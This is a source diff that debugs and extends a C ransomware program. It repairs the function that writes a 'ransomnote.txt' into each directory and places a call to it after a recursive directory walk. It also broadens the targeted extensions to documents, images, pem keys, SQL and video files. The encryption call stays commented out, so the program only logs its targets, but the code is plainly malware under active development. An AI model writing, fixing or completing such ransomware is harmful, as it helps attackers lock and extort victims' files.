@@ -22,16 +22,17 @@ void startEncrypting(char * start,unsigned char * key, unsigned char * iv,char *
 
 void writeRansomNote(char * directory,char * id)
 {
-    char * filename = calloc(1,sizeof(char) * strlen(directory)+strlen("ransomnote.txt") +1);
+    char * filename = calloc(1,sizeof(char) * (strlen(directory)+strlen("ransomnote.txt") +1));
     strcpy(filename,directory);
-    strcpy(filename,"ransomnote.txt");
+    strcat(filename,"ransomnote.txt");
     FILE * fp = fopen(filename,"w");
+    
     char * ransomnote = calloc(1,strlen(NOTE1)+strlen(NOTE2) +sizeof(id));
-
     strcpy(ransomnote,NOTE1);
-    strcpy(ransomnote,id);
-    strcpy(ransomnote,NOTE2);
+    strcat(ransomnote,id);
+    strcat(ransomnote,NOTE2);
     fwrite(ransomnote,1,strlen(ransomnote),fp);
+
     free(filename);
     free(ransomnote);
 }
@@ -58,10 +59,15 @@ void directory_handle(char * name,unsigned char * key, unsigned char * iv,char *
     	} else if(fDirent->d_type == DT_DIR){
     		directory_handle(fullpath,key,iv,id);
     	}
-        //writeRansomNote(fullpath,id);
     	free(fullpath);
     }
-    
+
+    char * fullpath = calloc(1,1024);
+    strcpy(fullpath,name);
+    strcat(fullpath,"/");
+    writeRansomNote(fullpath,id);
+    free(fullpath);
+
     closedir(fDir);
 }
 
@@ -75,18 +81,15 @@ char *get_filename_ext(const char *filename)
 void file_handler(char * filepath, char * filename,unsigned char * key, unsigned char * iv)
 {
 
-	char * full_fileName = malloc(strlen(filepath)+strlen(filepath+2));
-	strcpy(full_fileName,filepath);
-	strcpy(full_fileName,filename);
-    char * file_ext = get_filename_ext(full_fileName);
-    if(strcmp(file_ext,"doc")  == 0 || strcmp(file_ext,"docx") == 0 || strcmp(file_ext,"java") == 0 || strcmp(file_ext,"pdf")  == 0 || strcmp(file_ext,"jpg")  == 0 ||strcmp(file_ext,"txt")  == 0 ||strcmp(file_ext,"pdf")  == 0 ||strcmp(file_ext,"MDF")  == 0 || strcmp(file_ext,"ppt")  == 0 || strcmp(file_ext,"pem")  == 0 || strcmp(file_ext,"sql")  == 0 || strcmp(file_ext,"mp4"))
+    printf("filepath %s\n",filepath);
+    char * file_ext = get_filename_ext(filepath);
+    printf("file_ext: %s filename= %s\n",file_ext,filepath);
+    if(strcmp(file_ext,"") == 0 ||strcmp(file_ext,"txt") == 0 || strcmp(file_ext,"doc")  == 0 || strcmp(file_ext,"docx") == 0 || strcmp(file_ext,"java") == 0 || strcmp(file_ext,"png") == 0 || strcmp(file_ext,"pdf")  == 0 || strcmp(file_ext,"jpg")  == 0||strcmp(file_ext,"MDF")  == 0 || strcmp(file_ext,"ppt")  == 0 || strcmp(file_ext,"pem")  == 0 || strcmp(file_ext,"sql")  == 0 || strcmp(file_ext,"mp4") == 0)
     {
-         printf("encrypting: %s\n",full_fileName);
+         printf("encrypting: %s\n",filepath);
 
         //encrypt(full_fileName,key,iv);
     }
-
-    free(full_fileName);
 
 }
 
